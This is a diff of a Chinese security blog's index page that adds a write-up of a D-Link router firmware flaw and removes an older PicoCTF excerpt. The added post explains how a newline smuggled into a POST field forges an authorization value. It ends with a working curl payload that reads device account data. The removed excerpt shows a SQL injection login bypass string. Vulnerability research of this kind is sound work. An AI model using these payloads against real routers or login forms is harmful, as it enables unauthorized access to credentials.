@@ -247,6 +247,152 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/15/Dlink DIR-823L远程敏感信息读取漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Windylh">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Windylh's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/11/15/Dlink DIR-823L远程敏感信息读取漏洞/" itemprop="url">
+                  Dlink DIR-823L远程敏感信息读取漏洞
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-15T00:18:13+08:00">
+                2018-11-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/11/15/Dlink DIR-823L远程敏感信息读取漏洞/" class="leancloud_visitors" data-flag-title="Dlink DIR-823L远程敏感信息读取漏洞">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>有幸加入了360的IOT计划，接触一下IOT安全。</p>
+<h2 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h2><h3 id="下载固件"><a href="#下载固件" class="headerlink" title="下载固件"></a>下载固件</h3><p><a href="https://tsd.dlink.com.tw/downloads2008detailgo.asp" target="_blank" rel="external">Dlink DIR-850L A1 FW v1.14固件下载</a></p>
+<h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>安装binwalk和qemu<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">brew install biwalk</div><div class="line">brew install qemu</div><div class="line">brew install squashfs</div></pre></td></tr></table></figure></p>
+<h3 id="固件提取"><a href="#固件提取" class="headerlink" title="固件提取"></a>固件提取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binwalk -Me DIR850LA1_FW114WWb07.bin</div></pre></td></tr></table></figure>
+<h2 id="固件分析"><a href="#固件分析" class="headerlink" title="固件分析"></a>固件分析</h2><p>因为不是很懂Bin的知识，所以到<code>squashfs-root/htdocs/web</code>分析php页面。</p>
+<p>找到<code>htdocs/web/getcfg.php</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span> <span class="keyword">include</span> <span class="string">"/htdocs/phplib/trace.php"</span>;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_power_user</span><span class="params">()</span> //管理用户权限</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>($_GLOBALS[<span class="string">"AUTHORIZED_GROUP"</span>] == <span class="string">""</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span>($_GLOBALS[<span class="string">"AUTHORIZED_GROUP"</span>] &lt; <span class="number">0</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_POST[<span class="string">"CACHE"</span>] == <span class="string">"true"</span>)</div><div class="line">&#123;</div><div class="line">    <span class="keyword">echo</span> dump(<span class="number">1</span>, <span class="string">"/runtime/session/"</span>.$SESSION_UID.<span class="string">"/postxml"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span>(is_power_user() == <span class="number">1</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="comment">/* cut_count() will return 0 when no or only one token. */</span></div><div class="line">        $SERVICE_COUNT = cut_count($_POST[<span class="string">"SERVICES"</span>], <span class="string">","</span>);</div><div class="line">        TRACE_debug(<span class="string">"GETCFG: got "</span>.$SERVICE_COUNT.<span class="string">" service(s): "</span>.$_POST[<span class="string">"SERVICES"</span>]);</div><div class="line">        $SERVICE_INDEX = <span class="number">0</span>;</div><div class="line">        <span class="keyword">while</span> ($SERVICE_INDEX &lt; $SERVICE_COUNT)</div><div class="line">        &#123;</div><div class="line">            $GETCFG_SVC = cut($_POST[<span class="string">"SERVICES"</span>], $SERVICE_INDEX, <span class="string">","</span>);</div><div class="line">            TRACE_debug(<span class="string">"GETCFG: serivce["</span>.$SERVICE_INDEX.<span class="string">"] = "</span>.$GETCFG_SVC);</div><div class="line">            <span class="keyword">if</span> ($GETCFG_SVC!=<span class="string">""</span>)</div><div class="line">            &#123;</div><div class="line">                $file = <span class="string">"/htdocs/webinc/getcfg/"</span>.$GETCFG_SVC.<span class="string">".xml.php"</span>; <span class="comment">//读取文件直接拼接到字符串</span></div><div class="line">                <span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></div><div class="line">                <span class="keyword">if</span> (isfile($file)==<span class="string">"1"</span>) dophp(<span class="string">"load"</span>, $file);</div><div class="line">            &#125;</div><div class="line">            $SERVICE_INDEX++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="comment">/* not a power user, return error message */</span></div><div class="line">        <span class="keyword">echo</span> <span class="string">"\t&lt;result&gt;FAILED&lt;/result&gt;\n"</span>;</div><div class="line">        <span class="keyword">echo</span> <span class="string">"\t&lt;message&gt;Not authorized&lt;/message&gt;\n"</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>$GETCFG_SVC变量直接从POST中获取，并且没有过滤就直接放入了字符串，只要能绕过is_power_user()j就能构造payload读取敏感文件，$_GLOBALS数组是在cgibin文件中定义的，而不是php的原生数组。所以需要分析一下cgibin文件。</p>
+<p>mips架构没法用ida反编译，Web狗看不懂汇编代码，只能放到jeb里反编译。</p>
+<p>对main进行分析，不同的请求会到不同的文件处理，找到phpcgi函数。</p>
+<p><img src="https://github.com/Windylh/image/raw/master/2018.11.15/mips1.png" alt=""></p>
+<p>下面是关键代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">$$v0 = sess_validate($$a0, $$a1, <span class="number">524288</span>, $$a3);</div><div class="line">$$a2 = $$v0;</div><div class="line">$$v0 = <span class="built_in">sprintf</span>(&amp;var30_8, <span class="string">"AUTHORIZED_GROUP=%d"</span>);</div><div class="line">$$v0 = sobj_add_string($$s0, &amp;var30_8, $$a2, $$a3);</div><div class="line">$$v0 = sobj_add_char($$s0, <span class="number">10</span>, $$a2, $$a3);</div><div class="line">$$v0 = sobj_add_string($$s0, <span class="string">"SESSION_UID="</span>, $$a2, $$a3);</div><div class="line">$$v0 = sess_get_uid($$s0, <span class="string">"SESSION_UID="</span>, $$a2, $$a3);</div><div class="line">$$v0 = sobj_add_char($$s0, <span class="number">10</span>, $$a2, $$a3);</div><div class="line">$$v0 = sobj_get_string($$s0, <span class="number">10</span>, $$a2, $$a3);</div><div class="line">$$a0 = <span class="number">0</span>;</div><div class="line">$$a2 = $$v0;</div><div class="line">$$a3 = **&amp;gvar_437E18;</div><div class="line">$$a1 = <span class="number">0</span>;</div><div class="line">$$v0 = xmldbc_ephp(<span class="number">0</span>, <span class="number">0</span>, $$a2, $$a3);</div><div class="line">$$s1 = $$v0;</div></pre></td></tr></table></figure></p>
+<p>在 phpcgi_main 函数中，程序将不同的请求头处理后传给了php。关键代码将经过<code>sess_validate</code>验证的数据，赋值给<code>AUTHORIZED_GROUP</code>，然后再作为全局数组<code>$_GLOBALS</code>传递给PHP程序使用。<code>sobj_add_string</code>以 \n分隔储存在字符串中，所以用户可以通过注入带有 \n 字符的恶意 payload 来伪造<code>$_GLOBALS[&quot;AUTHORIZED_GROUP&quot;]</code>的值，从而读取敏感文件。</p>
+<p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl -d &quot;SERVICES=DEVICE.ACCOUNT&amp;attack=ture%0aAUTHORIZED_GROUP=1&quot; &quot;http://ip:port/getcfg.php&quot;</div></pre></td></tr></table></figure></p>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://xz.aliyun.com/t/2941" target="_blank" rel="external">https://xz.aliyun.com/t/2941</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/11/hctf2018 Web部分Writeup/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1480,144 +1626,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/09/18/PicoCTF-level2-WriteUp/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Windylh">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/Windylh/image/master/logo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Windylh's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/09/18/PicoCTF-level2-WriteUp/" itemprop="url">
-                  PicoCTF Level2 WriteUp
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-18T00:00:00+08:00">
-                2017-09-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2017/09/18/PicoCTF-level2-WriteUp/" class="leancloud_visitors" data-flag-title="PicoCTF Level2 WriteUp">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="My-First-SQL"><a href="#My-First-SQL" class="headerlink" title="My First SQL"></a>My First SQL</h3><p>网页是一个登录界面，尝试万能密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">admin</div><div class="line">&apos;or&apos;1&apos;=&apos;1</div></pre></td></tr></table></figure></p>
-<p>成功登陆。</p>
-<p>分析sql查询语句如下<br><code>select * from users where user = &#39;admin&#39; and pass = &#39;&#39;or&#39;1&#39;=&#39;1&#39;;</code><br>
-          <!--noindex-->
-          <div class="post-button text-center">
-            <a class="btn" href="/2017/09/18/PicoCTF-level2-WriteUp/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1667,7 +1675,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">27</span>
+                <span class="site-state-item-count">28</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -1680,7 +1688,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-count">12</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
